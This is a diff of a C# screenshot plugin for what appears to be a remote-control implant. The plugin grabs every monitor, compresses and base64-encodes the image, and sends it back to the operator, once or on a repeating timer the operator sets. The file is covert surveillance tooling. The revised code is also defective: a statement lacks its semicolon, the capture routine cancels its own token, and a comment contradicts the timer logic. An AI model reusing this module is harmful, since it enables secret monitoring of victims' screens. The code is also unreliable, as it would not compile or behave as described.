@@ -1,16 +1,15 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Drawing;
-using System.IO.Compression;
+﻿using System.Drawing;
 using System.Runtime.InteropServices;
-using System.Text.Json;
-using System.Threading;
-using System.Threading.Tasks;
+using System.IO.Compression;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 using screenshot;
+using System.Text.Json;
 
+
+//Nuget - System.drawing.common 
+//Only works on windows
 namespace Agent
 {
     public class Plugin : IPlugin
@@ -25,90 +24,39 @@ namespace Agent
         {
             this.messageManager = messageManager;
         }
-
         public async Task Execute(ServerJob job)
         {
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
 
+            if (args.interval <= 0)
+            {
+                cancellationTokenSource.Cancel();
+                await CaptureAndSendScreenshot(job.task.id);
+            }
+            else
+            {
+                cancellationTokenSource = new CancellationTokenSource()
+                screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
+                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(job.task.id);
+
+                // Set AutoReset to false for a one-time execution if the interval is greater than 0
+                screenshotTimer.AutoReset = args.interval > 0;
+                screenshotTimer.Enabled = true;
+                await messageManager.AddResponse(new ResponseResult
+                {
+                    completed = true,
+                    user_output = $"Capturing screenshots every {args.interval} seconds.",
+                    task_id = job.task.id,
+                });
+            }
+        }
+
+        private async Task CaptureAndSendScreenshot(string task_id)
+        {
+            cancellationTokenSource.Cancel();
             try
             {
-                if (args.interval == 0)
-                {
-                    // If the interval is set to 0, cancel the screenshot task if it's running
-                    if (isRunning)
-                    {
-                        cancellationTokenSource.Cancel();
-                        isRunning = false;
-                        await messageManager.WriteLine("Task has been canceled.", job.task.id, true);
-                    }
-                    else
-                    {
-                        // Take a single screenshot
-                        await CaptureAndSendScreenshot(job.task.id, CancellationToken.None);
-                    }
-                }
-                else if (args.interval < 0)
-                {
-                    await messageManager.WriteLine("Invalid interval value. It must be a non-negative integer.", job.task.id, true);
-                }
-                else
-                {
-                    // Handle starting a new screenshot task with the specified interval...
-                    if (isRunning)
-                    {
-                        await messageManager.WriteLine("A screenshot task is already running. Wait for it to complete or cancel it.", job.task.id, true);
-                    }
-                    else
-                    {
-                        cancellationTokenSource = new CancellationTokenSource(); // Create a new CancellationTokenSource
-                        Task.Run(async () =>
-                        {
-                            isRunning = true;
-                            await CaptureScreenshotsWithInterval(args, job.task.id, cancellationTokenSource.Token);
-                            isRunning = false;
-                        });
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                // Handle and log the exception as needed
-                await HandleExecutionError(job.task.id, ex);
-            }
-        }
 
-        private async Task HandleExecutionError(string task_id, Exception ex)
-        {
-            string errorMessage = $"An error occurred during the execution: {ex.Message}";
-            await messageManager.Write(errorMessage, task_id, true, "error");
-
-            // Log the error using your logger
-            // logger.LogError(errorMessage);
-        }
-
-        private async Task CaptureScreenshotsWithInterval(ScreenshotArgs args, string task_id, CancellationToken token)
-        {
-            int intervalInSeconds = args.interval;
-
-            while (!token.IsCancellationRequested)
-            {
-                await CaptureAndSendScreenshot(task_id, token);
-                try
-                {
-                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
-                }
-                catch (TaskCanceledException)
-                {
-                    // Task was canceled, exit the loop.
-                    break;
-                }
-            }
-        }
-
-        private async Task CaptureAndSendScreenshot(string task_id, CancellationToken token)
-        {
-            try
-            {
                 var bitmaps = ScreenCapture.Capture();
 
                 // Determine the size of the combined bitmap
@@ -145,7 +93,7 @@ namespace Agent
                 // Compress the image
                 using (var memoryStream = new MemoryStream())
                 {
-                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
+                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
                     {
                         gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                     }
@@ -153,20 +101,17 @@ namespace Agent
                 }
 
                 var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
-
-                // Check for cancellation before adding the response
-                if (!token.IsCancellationRequested)
+                await messageManager.AddResponse(new ResponseResult
                 {
-                    await messageManager.WriteLine("Screenshot captured.", task_id, true);
-                }
+                    completed = true,
+                    user_output = "Screenshot captured.",
+                    task_id = task_id,
+                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
+                });
             }
             catch (Exception e)
             {
-                // Check for cancellation before reporting the error
-                if (!token.IsCancellationRequested)
-                {
-                    await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
-                }
+                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
             }
         }
     }
@@ -260,4 +205,5 @@ namespace Agent
             return monitors;
         }
     }
+
 }
